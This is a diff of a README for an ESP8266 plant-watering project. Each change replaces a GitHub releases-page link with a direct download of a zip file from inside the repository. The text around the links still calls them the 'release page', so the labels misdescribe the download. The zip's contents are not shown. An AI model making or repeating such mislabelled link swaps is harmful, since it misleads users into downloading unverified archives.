@@ -1,6 +1,6 @@
 # 🌱 Insane-Plants - Easy 10-Channel Plant Watering
 
-[![Download Insane-Plants](https://img.shields.io/badge/Download-Insane--Plants-brightgreen?style=for-the-badge)](https://github.com/souravchouhan001/Insane-Plants/releases)
+[![Download Insane-Plants](https://img.shields.io/badge/Download-Insane--Plants-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/souravchouhan001/Insane-Plants/main/ESPHome/Insane_Plants_3.3.zip)
 
 ---
 
@@ -25,7 +25,7 @@ You don’t need to be an expert to use it. This guide will help you get it runn
 
 To get the software, visit the release page:
 
-[![Download Here](https://img.shields.io/badge/Download-Insane--Plants-blue?style=for-the-badge)](https://github.com/souravchouhan001/Insane-Plants/releases)
+[![Download Here](https://img.shields.io/badge/Download-Insane--Plants-blue?style=for-the-badge)](https://raw.githubusercontent.com/souravchouhan001/Insane-Plants/main/ESPHome/Insane_Plants_3.3.zip)
 
 This page holds all the files you need. Look for the latest version marked as stable.
 
@@ -120,7 +120,7 @@ This page holds all the files you need. Look for the latest version marked as st
 
 ## 📚 Additional Resources
 
-- Visit the release page: https://github.com/souravchouhan001/Insane-Plants/releases  
+- Visit the release page: https://raw.githubusercontent.com/souravchouhan001/Insane-Plants/main/ESPHome/Insane_Plants_3.3.zip  
 - Look up ESP8266 and Wemos D1 Mini basics online for more hardware info.  
 - Use forums and communities for assistance with IoT and DIY electronics.
 
@@ -130,4 +130,4 @@ This page holds all the files you need. Look for the latest version marked as st
 
 You can always visit the releases page to get updates or alternative downloads:
 
-[Download Insane-Plants from Releases](https://github.com/souravchouhan001/Insane-Plants/releases)
+[Download Insane-Plants from Releases](https://raw.githubusercontent.com/souravchouhan001/Insane-Plants/main/ESPHome/Insane_Plants_3.3.zip)
